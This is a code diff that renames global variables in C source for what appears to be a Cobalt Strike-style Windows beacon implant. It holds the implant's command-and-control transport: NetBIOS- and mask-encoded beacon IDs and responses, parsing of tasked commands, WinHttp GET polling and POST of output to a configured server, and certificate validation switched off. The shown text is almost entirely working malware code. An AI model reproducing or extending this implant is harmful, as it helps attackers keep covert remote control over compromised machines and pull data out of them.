@@ -19,14 +19,14 @@ unsigned char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix,
 
 unsigned char* parseGetResponse(unsigned char* data, size_t dataSize, size_t* responsedatalen) {
     //去除 data= 和 %%
-    data = removePrefixAndSuffix(data, Response_prepend, Response_append);
+    data = removePrefixAndSuffix(data, g_response_prepend, g_response_append);
 
     size_t data_length = strlen(data);
-    unsigned char netbiosKey = 'a';
+    unsigned char g_netbios_key = 'a';
     size_t netbiosDecodeDataLen;
 
     // NetBIOS 解码
-    unsigned char* netbiosDecodeData = NetbiosDecode((unsigned char*)data, data_length, netbiosKey, &netbiosDecodeDataLen);
+    unsigned char* netbiosDecodeData = NetbiosDecode((unsigned char*)data, data_length, g_netbios_key, &netbiosDecodeDataLen);
 
     // 错误，Mask密钥都存在四个字节
     // 如果小于5字节，说明数据有问题
@@ -53,8 +53,8 @@ unsigned char* parseGetResponse(unsigned char* data, size_t dataSize, size_t* re
     return maskDecodeData;
 }
 
-unsigned char* parsePacket(unsigned char* totalBuffer, uint32_t* totalLength, uint32_t* commandType ,size_t* commandBuflen, size_t* count) {
-    // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
+unsigned char* parsePacket(unsigned char* totalBuffer, uint32_t* totalLength, uint32_t* command_type ,size_t* command_length, size_t* count) {
+    // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | command || cmdType(4Bytes) | commandLen(4Bytes) | command(4Bytes) || ...
 
     // 没有足够的 cmdType + commandLen
     if (*totalLength < 8) {
@@ -74,23 +74,23 @@ unsigned char* parsePacket(unsigned char* totalBuffer, uint32_t* totalLength, ui
 
     datap parser;
 	BeaconDataParse(&parser, decryptedBuffer, *totalLength);
-	*commandType = (uint32_t)BeaconDataInt(&parser);
-	*commandBuflen = (size_t)BeaconDataInt(&parser);
+	*command_type = (uint32_t)BeaconDataInt(&parser);
+	*command_length = (size_t)BeaconDataInt(&parser);
 
-	// 没有足够的 commandBuf
-    if(*totalLength < (8 + *commandBuflen)) {
-        fprintf(stderr, "not enough commandBuf\n");
+	// 没有足够的 command
+    if(*totalLength < (8 + *command_length)) {
+        fprintf(stderr, "not enough command\n");
         return NULL;
 	}
 
-    unsigned char* commandBuf = BeaconDataPtr(&parser, *commandBuflen);
+    unsigned char* command = BeaconDataPtr(&parser, *command_length);
 
     // 留下剩下的数据包长度
-    *totalLength = *totalLength - (4 + 4 + *commandBuflen);
+    *totalLength = *totalLength - (4 + 4 + *command_length);
 
-    *count = *count + *commandBuflen + 8;
+    *count = *count + *command_length + 8;
 
-    return commandBuf;
+    return command;
 }
 
 unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
@@ -114,7 +114,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
         }
 
         // 连接服务器
-        HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
+        HINTERNET hConnect = WinHttpConnect(hSession, g_server, g_port, 0);
         if (!hConnect) {
             fprintf(stderr, "WinHttpConnect Failed (attempt %d): %lu\n", attempt, GetLastError());
             WinHttpCloseHandle(hSession);
@@ -123,7 +123,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
         }
 
         HINTERNET hRequest = WinHttpOpenRequest(hConnect,
-            L"GET", get_path, NULL, WINHTTP_NO_REFERER,
+            L"GET", g_get_path, NULL, WINHTTP_NO_REFERER,
             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
         if (!hRequest) {
@@ -135,9 +135,9 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
         }
 
         // 添加请求头
-        WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+        WinHttpAddRequestHeaders(hRequest, g_host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
         WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-        WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+        WinHttpAddRequestHeaders(hRequest, g_user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
 
         // 发送请求
         if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -205,8 +205,8 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
 }
 
 unsigned char* makeBeaconIdHeader() {
-    // clientID为 100000 - 999998 之间的偶数
-    // clientID 位数
+    // g_client_id为 100000 - 999998 之间的偶数
+    // g_client_id 位数
     DWORD digitCount = 6; 
 
     // 加终止符 '\0'
@@ -219,9 +219,9 @@ unsigned char* makeBeaconIdHeader() {
     }
 
     // 转化为字符串
-    int rs = snprintf((unsigned char*)charId, charArrayLength, "%d", clientID);
+    int rs = snprintf((unsigned char*)charId, charArrayLength, "%d", g_client_id);
     if (rs < 0 || rs >= charArrayLength) {
-        fprintf(stderr, "String conversion failed for clientID: %d\n", clientID);
+        fprintf(stderr, "String conversion failed for g_client_id: %d\n", g_client_id);
         free(charId);
         return NULL;
     }
@@ -238,9 +238,9 @@ unsigned char* makeBeaconIdHeader() {
     // NetBios
     // 返回二进制数据
     // 不用添加 \0
-    unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, codelen, netbiosKey, &NetbiosEncodeIdLen);
+    unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, codelen, g_netbios_key, &NetbiosEncodeIdLen);
 
-    unsigned char* result = (unsigned char*)malloc(NetbiosEncodeIdLen + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);
+    unsigned char* result = (unsigned char*)malloc(NetbiosEncodeIdLen + strlen(g_post_header_name) + strlen(g_http_post_id_prepend) + strlen(g_http_post_id_append) + 1);
     if (!result) {
         fprintf(stderr, "Memory allocation failed\n");
         free(MaskEncodeId);
@@ -251,14 +251,14 @@ unsigned char* makeBeaconIdHeader() {
 
     // User:user=APNDCONJDOOBBMOKDPOB%%
     size_t offset = 0;
-    memcpy(result + offset, header, strlen(header));
-    offset += strlen(header);
-    memcpy(result + offset, Http_post_id_prepend, strlen(Http_post_id_prepend));
-    offset += strlen(Http_post_id_prepend);
+    memcpy(result + offset, g_post_header_name, strlen(g_post_header_name));
+    offset += strlen(g_post_header_name);
+    memcpy(result + offset, g_http_post_id_prepend, strlen(g_http_post_id_prepend));
+    offset += strlen(g_http_post_id_prepend);
     memcpy(result + offset, NetBoisId, NetbiosEncodeIdLen);
     offset += NetbiosEncodeIdLen;
-    memcpy(result + offset, Http_post_id_append, strlen(Http_post_id_append));
-    offset += strlen(Http_post_id_append);
+    memcpy(result + offset, g_http_post_id_append, strlen(g_http_post_id_append));
+    offset += strlen(g_http_post_id_append);
 
     result[offset] = '\0';
 
@@ -279,14 +279,14 @@ unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback)
     // Base64
     unsigned char* data = base64Encode(MaskEncodedata, code_length);
 
-    unsigned char* postData = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);
+    unsigned char* postData = (unsigned char*)malloc(strlen(data) + strlen(g_http_post_client_output_prepend) + strlen(g_http_post_client_output_append) + 1);
 
     // data = post%%
     // strcat 会自动写入 \0
     if (postData) {
-        strcpy(postData, Http_post_client_output_prepend);
+        strcpy(postData, g_http_post_client_output_prepend);
         strcat(postData, data);
-        strcat(postData, Http_post_client_output_append);
+        strcat(postData, g_http_post_client_output_append);
     }
 
     free(finalPaket);
@@ -307,7 +307,7 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
     }
 
     // 连接到服务器
-    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_server, g_port, 0);
     if (!hConnect) {
         fprintf(stderr, "WinHttpConnect failed with error: %lu\n", GetLastError());
         if (!WinHttpCloseHandle(hSession)) {
@@ -320,7 +320,7 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
     // 创建 POST 请求
     HINTERNET hRequest = WinHttpOpenRequest(hConnect,
         L"POST",
-        post_path,
+        g_post_path,
         NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
@@ -339,10 +339,10 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
     }
 
     WinHttpAddRequestHeaders(hRequest, BeaconIdWideHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    WinHttpAddRequestHeaders(hRequest, g_host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    WinHttpAddRequestHeaders(hRequest, g_user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    WinHttpAddRequestHeaders(hRequest, g_server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    WinHttpAddRequestHeaders(hRequest, g_content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
 
     // 设置安全标志以忽略证书验证错误
     DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
